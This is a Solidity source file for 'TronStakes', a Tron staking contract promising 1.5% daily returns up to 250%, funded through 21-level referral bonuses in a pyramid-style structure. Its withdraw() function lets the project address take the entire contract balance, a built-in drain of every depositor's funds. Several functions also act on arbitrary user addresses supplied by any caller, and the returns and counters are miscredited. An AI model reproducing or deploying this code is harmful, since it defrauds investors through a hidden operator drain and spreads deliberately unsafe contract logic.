//SourceUnit: tronstakes.sol

/*
 ______   ______     ______     __   __     ______     ______   ______     __  __     ______     ______    
/\__  _\ /\  == \   /\  __ \   /\ "-.\ \   /\  ___\   /\__  _\ /\  __ \   /\ \/ /    /\  ___\   /\  ___\   
\/_/\ \/ \ \  __<   \ \ \/\ \  \ \ \-.  \  \ \___  \  \/_/\ \/ \ \  __ \  \ \  _"-.  \ \  __\   \ \___  \  
   \ \_\  \ \_\ \_\  \ \_____\  \ \_\\"\_\  \/\_____\    \ \_\  \ \_\ \_\  \ \_\ \_\  \ \_____\  \/\_____\ 
    \/_/   \/_/ /_/   \/_____/   \/_/ \/_/   \/_____/     \/_/   \/_/\/_/   \/_/\/_/   \/_____/   \/_____/ 
                                                                                                           
*/

pragma solidity 0.5.10;

contract TronStakes {
    using SafeMath for uint256;
    
    uint256 constant public INVEST_MIN_AMOUNT = 200 trx;
    address payable public projectAddress;
    uint256 constant public PROJECT_FEE = 30;
    uint256[] public REFERRAL_PERCENTS = [70, 30, 10];
    uint256[] public ROI_REFERRAL_PERCENTS = [350, 150, 100, 100, 80, 80, 80, 70, 70, 70, 50, 50, 50, 50, 50, 50, 50, 30, 30, 20, 20];
    uint256 constant public BASE_PERCENT = 15;
    uint256 constant public TIME_STEP = 1 days;
    uint256 constant public PERCENTS_DIVIDER = 1000;
    
    uint256 public totalUsers;
    uint256 public totalStakingUsers;
    uint256 public totalDeposits;
    uint256 public totalStakingDeposits;
    uint256 public totalMoveStakingNo;
	uint256 public totalMoveStaking;
	uint256 public totalMoveLiquidity;
	uint256 public totalCharges;
    uint256 public totalWithdrawn;
    uint256 public totalNoWithdrawn;

    struct Deposit {
		uint256 amount;
		uint256 withdrawn;
		uint256 start;
	}

    struct Staking {
		uint256 amount;
		uint256 withdrawn;
		uint256 start;
	}
	
	struct Levels{
        uint128 level1;
	    uint128 level2;
	    uint128 level3;
        uint128 level4;
        uint128 level5;
        uint128 level6;
        uint128 level7;
        uint128 level8;
        uint128 level9;
        uint128 level10;
        uint128 level11;
        uint128 level12;
        uint128 level13;
        uint128 level15;
        uint128 level14;
        uint128 level16;
        uint128 level17;
        uint128 level18;
        uint128 level19;
        uint128 level20;
        uint128 level21;
	}
   
    struct User {
        Deposit[] deposits;
        Staking[] stakings;
        
        uint256 checkpoint;
        
        address referrer;
        uint256 total_refer;
        
        uint256 total_user_deposits;
        uint256 total_user_staking_deposits;
        
        uint256 total_deposit;
        uint40 deposit_time;
        
        uint256 total_staking;
        uint40 staking_time;
        
        uint256 total_withdrawal;
        
        uint256 bonus;
        uint256 total_bonus;
        
        uint256 staking_roi;
        uint256 total_staking_roi;
        uint256 roibonus;
        uint256 total_roibonus;
        
        Levels leveldetail;
    }

    mapping(address => User) users;

	event NewLiquidityDeposit(address indexed user, uint256 amount);
    event NewStakingDeposit(address indexed user, uint256 amount);
	event Withdrawn(address indexed user, uint256 amount);
	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
	event RoiBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);

    constructor(address payable projectAddr) public {
		require(!isContract(projectAddr));
		projectAddress = projectAddr;
	}

    function invest(address referrer) public payable {
		require(msg.value >= INVEST_MIN_AMOUNT);

		projectAddress.transfer(msg.value.mul(PROJECT_FEE).div(PERCENTS_DIVIDER));
		emit FeePayed(msg.sender, msg.value.mul(PROJECT_FEE).div(PERCENTS_DIVIDER));

		User storage user = users[msg.sender];

		if (user.referrer == address(0) && users[referrer].deposits.length > 0 && referrer != msg.sender) {
			user.referrer = referrer;
		}
		
		if (user.referrer != address(0)) {
			address upline = user.referrer;
			for (uint256 i = 0; i < 21; i++) {
				if (upline != address(0)) {
				    if(i == 0){
                        users[upline].leveldetail.level1 += 1;
					} else if(i == 1){
                         users[upline].leveldetail.level2 += 1;
					} else if(i == 2){
                         users[upline].leveldetail.level3 += 1;
					} else if(i == 3){
                         users[upline].leveldetail.level4 += 1;
					} else if(i == 4){
                         users[upline].leveldetail.level5 += 1;
					} else if(i == 5){
                         users[upline].leveldetail.level6 += 1;
					} else if(i == 6){
                         users[upline].leveldetail.level7 += 1;
					} else if(i == 7){
                         users[upline].leveldetail.level8 += 1;
					} else if(i == 8){
                         users[upline].leveldetail.level9 += 1;
					} else if(i == 9){
                         users[upline].leveldetail.level10 += 1;
					} else if(i == 10){
                         users[upline].leveldetail.level11 += 1;
					} else if(i == 11){
                         users[upline].leveldetail.level12 += 1;
					} else if(i == 12){
                         users[upline].leveldetail.level13 += 1;
					} else if(i == 13){
                         users[upline].leveldetail.level14 += 1;
					} else if(i == 14){
                         users[upline].leveldetail.level15 += 1;
					} else if(i == 15){
                         users[upline].leveldetail.level16 += 1;
					} else if(i == 16){
                         users[upline].leveldetail.level17 += 1;
					} else if(i == 17){
                         users[upline].leveldetail.level18 += 1;
					} else if(i == 18){
                         users[upline].leveldetail.level19 += 1;
					} else if(i == 19){
                         users[upline].leveldetail.level20 += 1;
					} else if(i == 20){
                         users[upline].leveldetail.level21 += 1;
					}
					
					upline = users[upline].referrer;
				} else break;
			}
		}
        
        users[referrer].total_refer += 1;
        users[msg.sender].total_deposit += msg.value;
        users[msg.sender].total_user_deposits += msg.value;
        users[msg.sender].deposit_time = uint40(block.timestamp);

        totalUsers += 1;
		totalDeposits += msg.value;

        user.deposits.push(Deposit(msg.value, 0, block.timestamp));

		emit NewLiquidityDeposit(msg.sender, msg.value);
	}

    function movestaking(address userAddress) public {
		User storage user = users[userAddress];
		
		users[userAddress].total_staking += user.total_deposit;
		users[userAddress].total_user_staking_deposits += user.total_deposit;
        users[userAddress].staking_time = uint40(block.timestamp);
 
        totalStakingUsers += 1;
		totalStakingDeposits += user.total_deposit;

        user.stakings.push(Staking(user.total_deposit, 0, block.timestamp));

		emit NewStakingDeposit(msg.sender, user.total_deposit);
		
		uint256 amount;

		if (user.referrer != address(0)) {
			address upline = user.referrer;
			for (uint256 i = 0; i < 3; i++) {
				if (upline != address(0)) {
				    amount = user.total_deposit.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
			        users[upline].bonus = users[upline].bonus.add(amount);
			        users[upline].total_bonus = users[upline].total_bonus.add(amount);
				    emit RefBonus(upline, msg.sender, i, amount);
					upline = users[upline].referrer;
				} else break;
			}
		}
		
		users[userAddress].total_deposit -= user.total_deposit;
	}
	
	function stakingmoveliquidity(address userAddress) public {
        User storage user = users[userAddress];
        
        uint256 tStaking = user.total_staking;
        uint256 cStaking = tStaking * 15 / 100; 
        uint256 mStaking = tStaking - cStaking; 
        
        getstakingreturn(msg.sender);
        
        if(mStaking > 0){
            user.total_staking -= tStaking;
            user.total_deposit += mStaking;
        }
        
        totalMoveStakingNo += 1;
		totalMoveStaking += tStaking;
		totalMoveLiquidity += mStaking;
		totalCharges += cStaking;
	}
	
	function getstakingreturn(address userAddress) private {
	    User storage user = users[userAddress];
	    
	    uint256 dividends;
		
	    uint256 total_mal_deposit = user.total_user_staking_deposits.mul(2500).div(PERCENTS_DIVIDER);
        uint256 tWithdrawal = user.total_withdrawal;
        
        if (user.total_staking > 0) {
	        if(total_mal_deposit > tWithdrawal){
    			for (uint256 i = 0; i < user.stakings.length; i++) {
        
        			if (user.stakings[i].withdrawn < user.stakings[i].amount.mul(2500).div(PERCENTS_DIVIDER)) {
        
        				if (user.stakings[i].start > user.checkpoint) {
        
        					dividends = (user.stakings[i].amount.mul(BASE_PERCENT).div(PERCENTS_DIVIDER))
        						.mul(block.timestamp.sub(user.stakings[i].start))
        						.div(TIME_STEP);
        
        				} else {
        
        					dividends = (user.stakings[i].amount.mul(BASE_PERCENT).div(PERCENTS_DIVIDER))
        						.mul(block.timestamp.sub(user.checkpoint))
        						.div(TIME_STEP);
        
        				}
        
        				if (user.stakings[i].withdrawn.add(dividends) > user.stakings[i].amount.mul(2500).div(PERCENTS_DIVIDER)) {
        					dividends = (user.stakings[i].amount.mul(2500).div(PERCENTS_DIVIDER)).sub(user.stakings[i].withdrawn);
        				}
        				
        				user.stakings[i].withdrawn = user.stakings[i].withdrawn.add(dividends);
        				
        				user.staking_roi = user.staking_roi.add(dividends);
        				user.total_staking_roi = user.total_staking_roi.add(dividends);
        			}
        		}
	        }
	    }
	}
	
	function withdraw() public {
		if (msg.sender == projectAddress){
		    
			uint256 contractBalance = address(this).balance;
			
			projectAddress.transfer(contractBalance);
			
		} else {
		    
		    uint256 contractBalance = address(this).balance;
		    
			User storage user = users[msg.sender];
			
			getstakingreturn(msg.sender);
			
			uint256 totalAmount = 0;
			
			uint256 stakingRoi = user.staking_roi;
			
			uint256 referralbonus = user.bonus;
			
			uint256 referroiBonus = user.roibonus;
			
			uint256 totalliquidity = user.total_deposit;
			
			uint256 withdrawamount = totalAmount.add(stakingRoi).add(referralbonus).add(referroiBonus).add(totalliquidity);
			
			if(withdrawamount+user.total_withdrawal > user.total_user_staking_deposits.mul(2500).div(PERCENTS_DIVIDER)){ 
		        withdrawamount = user.total_user_staking_deposits.mul(2500).div(PERCENTS_DIVIDER)-user.total_withdrawal; 
		    } 
	
			require(withdrawamount > 0, "User has no dividends");

			if (contractBalance < withdrawamount) {
				withdrawamount = contractBalance;
			}
			
			user.checkpoint = block.timestamp;

			msg.sender.transfer(withdrawamount);

			user.total_withdrawal += withdrawamount;
		    totalNoWithdrawn += 1;
		    totalWithdrawn += withdrawamount;
		    
		    emit Withdrawn(msg.sender, withdrawamount);
		    
		    user.total_deposit -= totalliquidity;
		    user.bonus -= referralbonus;
		    user.roibonus -= referroiBonus;
		    user.staking_roi -= stakingRoi;
		    
		    if(stakingRoi > 0){
		        address upline = user.referrer;
    			for (uint256 i = 0; i < 21; i++) {
    				if (upline != address(0)) {
    				    if(users[upline].total_refer >= i){
    				         uint256 ref_roi = stakingRoi.mul(ROI_REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
            				 users[upline].roibonus = users[upline].roibonus.add(ref_roi);
    					     users[upline].total_roibonus = users[upline].total_roibonus.add(ref_roi);
    					     
    					     emit RoiBonus(upline, msg.sender, i, ref_roi);
					         upline = users[upline].referrer;
    				    }
    				} else break;
    			}
		    }
		}
	}
	
	function getUserDividends(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];

		uint256 totalDividends;
		uint256 dividends;
		
	    uint256 total_mal_deposit = user.total_user_staking_deposits.mul(2500).div(PERCENTS_DIVIDER);
        uint256 tWithdrawal = user.total_withdrawal;
		
	    if (user.total_staking > 0) {
	        if(total_mal_deposit > tWithdrawal){
    			for (uint256 i = 0; i < user.stakings.length; i++) {
        
        			if (user.stakings[i].withdrawn < user.stakings[i].amount.mul(2500).div(PERCENTS_DIVIDER)) {
        
        				if (user.stakings[i].start > user.checkpoint) {
        
        					dividends = (user.stakings[i].amount.mul(BASE_PERCENT).div(PERCENTS_DIVIDER))
        						.mul(block.timestamp.sub(user.stakings[i].start))
        						.div(TIME_STEP);
        
        				} else {
        
        					dividends = (user.stakings[i].amount.mul(BASE_PERCENT).div(PERCENTS_DIVIDER))
        						.mul(block.timestamp.sub(user.checkpoint))
        						.div(TIME_STEP);
        
        				}
        
        				if (user.stakings[i].withdrawn.add(dividends) > user.stakings[i].amount.mul(2500).div(PERCENTS_DIVIDER)) {
        					dividends = (user.stakings[i].amount.mul(2500).div(PERCENTS_DIVIDER)).sub(user.stakings[i].withdrawn);
        				}
        
        				totalDividends = totalDividends.add(dividends);
        			}
        		}
	        }
	    }
		return totalDividends;
	}

    function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
    
    function getContractBalance() public view returns (uint256) {
		return address(this).balance;
	}
	
    function contractInfo() view external returns(uint256 base_per, uint256 total_users, uint256 total_staking_users, uint256 total_deposit, uint256 total_staking_deposit, uint256 total_withdrawal, uint256 total_no_withdrawal, uint256 total_move_staking_no, uint256 total_move_staking, uint256 total_move_liquidity, uint256 total_charges) {
        return (BASE_PERCENT, totalUsers, totalStakingUsers, totalDeposits, totalStakingDeposits, totalWithdrawn, totalNoWithdrawn, totalMoveStakingNo, totalMoveStaking, totalMoveLiquidity, totalCharges);
    }
    
    function userInfo(address addr) view external returns(address upline, uint40 deposit_time, uint256 total_deposit, uint256 staking_time, uint256 total_staking, uint256 total_withdrawal) {
        return (users[addr].referrer, users[addr].deposit_time, users[addr].total_deposit, users[addr].staking_time, users[addr].total_staking, users[addr].total_withdrawal);
    }
    
    function userInvestInfo(address addr) view external returns(uint256 tuserdeposits, uint256 tuserstakingdeposits, uint256 noliquidity, uint256 nostaking, uint256 stakingroi, uint256 tstakingroi) {
        return (users[addr].total_user_deposits, users[addr].total_user_staking_deposits, users[addr].deposits.length, users[addr].stakings.length, users[addr].staking_roi, users[addr].total_staking_roi);
    }
    
    function userEarningInfo(address addr) view external returns(uint256 total_bonus, uint256 total_roi_bonus, uint256 ebonus, uint256 eroibonus) {
        return (users[addr].total_bonus, users[addr].total_roibonus, users[addr].bonus, users[addr].roibonus);
    }
    
    function getFirstDownlineCount(address userAddress) public view returns(uint256, uint256, uint256, uint256, uint256, uint256, uint256) {
		return (users[userAddress].leveldetail.level1, users[userAddress].leveldetail.level2, users[userAddress].leveldetail.level3, users[userAddress].leveldetail.level4, users[userAddress].leveldetail.level5, users[userAddress].leveldetail.level6, users[userAddress].leveldetail.level7);
    }
    
    function getSecondDownlineCount(address userAddress) public view returns(uint256, uint256, uint256, uint256, uint256, uint256, uint256) {
		return (users[userAddress].leveldetail.level8, users[userAddress].leveldetail.level9, users[userAddress].leveldetail.level10, users[userAddress].leveldetail.level11, users[userAddress].leveldetail.level12, users[userAddress].leveldetail.level13, users[userAddress].leveldetail.level14);
    }
    
    function getThirdDownlineCount(address userAddress) public view returns(uint256, uint256, uint256, uint256, uint256, uint256, uint256) {
		return (users[userAddress].leveldetail.level15, users[userAddress].leveldetail.level16, users[userAddress].leveldetail.level17, users[userAddress].leveldetail.level18, users[userAddress].leveldetail.level19, users[userAddress].leveldetail.level20, users[userAddress].leveldetail.level21);
    }
    
    function getUserDoubleStaking(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];
	    uint256 doubleStaking = user.total_user_staking_deposits.mul(2500).div(PERCENTS_DIVIDER);
		return doubleStaking;
	}
}

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}